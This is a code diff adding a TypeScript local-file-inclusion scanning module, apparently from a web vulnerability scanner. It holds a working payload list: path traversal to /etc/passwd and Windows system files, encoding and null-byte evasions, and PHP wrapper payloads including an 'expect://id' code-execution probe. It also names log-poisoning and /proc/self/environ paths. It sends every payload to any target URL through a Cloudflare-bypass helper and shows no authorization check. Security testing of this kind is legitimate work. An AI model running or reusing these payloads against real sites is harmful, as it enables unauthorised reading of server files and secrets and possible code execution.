@@ -1,0 +1,245 @@
+import { normalizeUrl } from './apiUtils';
+import { bypassCloudflare } from './cloudflareBypass';
+import { RequestManager } from './requestManager';
+
+export interface LFIScanResult {
+  vulnerable: boolean;
+  testedPayloads: number;
+  vulnerabilities: Array<{
+    payload: string;
+    indicator: string;
+    severity: 'critical' | 'high' | 'medium';
+    type: string;
+    evidence?: string;
+    parameter?: string;
+    confidence: number;
+  }>;
+  tested: boolean;
+}
+
+const LFI_ERROR_PATTERNS = [
+  // Linux/Unix file content signatures
+  /root:x:0:0:/i,  // /etc/passwd
+  /\[boot loader\]/i,  // boot.ini
+  /\[extensions\]/i,  // php.ini
+  /\[fonts\]/i,  // win.ini
+  /DOCUMENT_ROOT/i,  // PHP environment
+  /LoadModule/i,  // Apache config
+  /extension=/i,  // PHP config
+  
+  // Error messages indicating file access
+  /failed to open stream/i,
+  /No such file or directory/i,
+  /Permission denied/i,
+  /include_path/i,
+  /failed opening/i,
+  /Warning.*include/i,
+  /require\(\): failed opening required/i,
+  /Fatal error.*include/i,
+  
+  // PHP wrappers exposure
+  /php:\/\/input/i,
+  /data:\/\/text/i,
+  /expect:\/\//i,
+];
+
+const LFI_PAYLOADS = [
+  // Basic traversal (Linux/Unix)
+  { payload: '../../../../../../../etc/passwd', type: 'Path Traversal (Unix)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '....//....//....//....//....//....//etc/passwd', type: 'Path Traversal (Bypass)', severity: 'critical' as const, confidence: 0.9 },
+  { payload: '..\\..\\..\\..\\..\\..\\..\\etc\\passwd', type: 'Path Traversal (Windows Style)', severity: 'critical' as const, confidence: 0.85 },
+  
+  // Windows paths
+  { payload: '../../../../../../../windows/system32/drivers/etc/hosts', type: 'Path Traversal (Windows)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', type: 'Path Traversal (win.ini)', severity: 'high' as const, confidence: 0.9 },
+  { payload: 'C:\\windows\\system32\\drivers\\etc\\hosts', type: 'Absolute Path (Windows)', severity: 'critical' as const, confidence: 0.95 },
+  
+  // Null byte injection (legacy PHP < 5.3)
+  { payload: '../../../../../../../etc/passwd%00', type: 'Null Byte Injection', severity: 'critical' as const, confidence: 0.85 },
+  { payload: '../../../../../../../etc/passwd%00.jpg', type: 'Null Byte + Extension', severity: 'critical' as const, confidence: 0.85 },
+  
+  // URL encoding evasion
+  { payload: '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', type: 'URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
+  { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', type: 'Double URL Encoded', severity: 'high' as const, confidence: 0.85 },
+  
+  // PHP wrappers
+  { payload: 'php://filter/convert.base64-encode/resource=index.php', type: 'PHP Filter Wrapper', severity: 'critical' as const, confidence: 0.95 },
+  { payload: 'php://input', type: 'PHP Input Stream', severity: 'critical' as const, confidence: 0.9 },
+  { payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', type: 'Data URI Wrapper', severity: 'critical' as const, confidence: 0.9 },
+  { payload: 'expect://id', type: 'Expect Wrapper (RCE)', severity: 'critical' as const, confidence: 0.95 },
+  
+  // Log poisoning vectors
+  { payload: '/var/log/apache2/access.log', type: 'Apache Log Access', severity: 'high' as const, confidence: 0.8 },
+  { payload: '/var/log/nginx/access.log', type: 'Nginx Log Access', severity: 'high' as const, confidence: 0.8 },
+  { payload: '../../../../../../../proc/self/environ', type: 'Proc Environ', severity: 'high' as const, confidence: 0.85 },
+  
+  // Config files
+  { payload: '../../../../../../../etc/php/7.4/apache2/php.ini', type: 'PHP Config Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '/etc/apache2/apache2.conf', type: 'Apache Config', severity: 'high' as const, confidence: 0.8 },
+  
+  // Advanced bypass techniques
+  { payload: '....//....//etc/passwd', type: 'Filter Bypass (Dot Slash)', severity: 'high' as const, confidence: 0.8 },
+  { payload: '..;/..;/..;/etc/passwd', type: 'Semicolon Bypass', severity: 'medium' as const, confidence: 0.75 },
+];
+
+const checkLFISignature = (response: string): { found: boolean; pattern?: string; confidence: number } => {
+  const lowerResponse = response.toLowerCase();
+  
+  for (const pattern of LFI_ERROR_PATTERNS) {
+    const match = response.match(pattern);
+    if (match) {
+      return {
+        found: true,
+        pattern: match[0],
+        confidence: 0.95,
+      };
+    }
+  }
+  
+  // Check for typical /etc/passwd structure (username:x:uid:gid:...)
+  if (/[a-z_][a-z0-9_-]*:[x\*]:[\d]+:[\d]+:/i.test(response)) {
+    return {
+      found: true,
+      pattern: 'Unix password file format detected',
+      confidence: 0.98,
+    };
+  }
+  
+  // Check for Windows INI file format
+  if (/\[[a-z\s]+\]/i.test(response) && /;.*comment/i.test(response)) {
+    return {
+      found: true,
+      pattern: 'Windows INI file format detected',
+      confidence: 0.9,
+    };
+  }
+  
+  return { found: false, confidence: 0 };
+};
+
+export const performLFIScan = async (
+  target: string,
+  requestManager?: RequestManager
+): Promise<LFIScanResult> => {
+  console.log(`[LFI Scan] Starting Local File Inclusion scan for ${target}`);
+  
+  const result: LFIScanResult = {
+    vulnerable: false,
+    testedPayloads: 0,
+    vulnerabilities: [],
+    tested: true,
+  };
+
+  try {
+    const url = normalizeUrl(target);
+    const urlObj = new URL(url);
+    
+    const params = new URLSearchParams(urlObj.search);
+    const paramKeys = Array.from(params.keys());
+    
+    if (paramKeys.length === 0) {
+      console.log('[LFI Scan] No parameters found, testing with common parameters');
+      paramKeys.push('file', 'page', 'include', 'path');
+    }
+
+    // Get baseline
+    let baselineLength = 0;
+    try {
+      const baselineResponse = await bypassCloudflare(url);
+      const baselineText = await baselineResponse.text();
+      baselineLength = baselineText.length;
+      console.log(`[LFI Scan] Baseline: ${baselineLength} bytes`);
+    } catch (error) {
+      console.warn('[LFI Scan] Could not get baseline');
+    }
+
+    for (const paramKey of paramKeys) {
+      for (const { payload, severity, type, confidence: baseConfidence } of LFI_PAYLOADS) {
+        try {
+          const testUrl = new URL(url);
+          const testParams = new URLSearchParams(testUrl.search);
+          testParams.set(paramKey, payload);
+          testUrl.search = testParams.toString();
+
+          console.log(`[LFI Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 40)}...`);
+
+          const response = requestManager 
+            ? await requestManager.fetch(testUrl.toString())
+            : await bypassCloudflare(testUrl.toString());
+          
+          result.testedPayloads++;
+
+          const text = await response.text();
+          const signatureCheck = checkLFISignature(text);
+
+          if (signatureCheck.found) {
+            console.log(`[LFI Scan] ⚠️ ${severity.toUpperCase()}: LFI vulnerability detected! ${signatureCheck.pattern}`);
+            result.vulnerable = true;
+            
+            const evidenceStart = text.toLowerCase().indexOf(signatureCheck.pattern?.toLowerCase() || '');
+            const evidence = evidenceStart >= 0
+              ? text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 300))
+              : text.substring(0, 400);
+            
+            result.vulnerabilities.push({
+              payload,
+              indicator: signatureCheck.pattern || 'File content exposed',
+              severity,
+              type,
+              evidence: evidence.substring(0, 400) + (evidence.length > 400 ? '...' : ''),
+              parameter: paramKey,
+              confidence: signatureCheck.confidence,
+            });
+          }
+
+          // Check for significant size changes
+          if (baselineLength > 0) {
+            const sizeDiff = Math.abs(text.length - baselineLength);
+            const percentDiff = (sizeDiff / baselineLength) * 100;
+            
+            if (percentDiff > 50 && text.length > baselineLength && text.length < 100000) {
+              console.log(`[LFI Scan] ⚠️ Suspicious content change: ${percentDiff.toFixed(1)}%`);
+              
+              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload)) {
+                result.vulnerable = true;
+                result.vulnerabilities.push({
+                  payload,
+                  indicator: 'Significant response size increase',
+                  severity: 'medium',
+                  type,
+                  evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, +${percentDiff.toFixed(1)}%)`,
+                  parameter: paramKey,
+                  confidence: 0.7,
+                });
+              }
+            }
+          }
+
+          await new Promise(resolve => setTimeout(resolve, 250));
+        } catch (error: any) {
+          if (error.message === 'Request aborted') {
+            console.log('[LFI Scan] Scan aborted by user');
+            throw error;
+          }
+          console.warn(`[LFI Scan] Payload test failed: ${error.message}`);
+        }
+      }
+    }
+
+    result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.7);
+
+    console.log(`[LFI Scan] Complete: ${result.vulnerabilities.length} vulnerabilities from ${result.testedPayloads} tests`);
+    return result;
+  } catch (error: any) {
+    if (error.message === 'Request aborted') {
+      throw error;
+    }
+    console.error('[LFI Scan] Critical error:', error);
+    return {
+      vulnerable: false,
+      testedPayloads: 0,
+      vulnerabilities: [],
+      tested: false,
+    };
+  }
+};
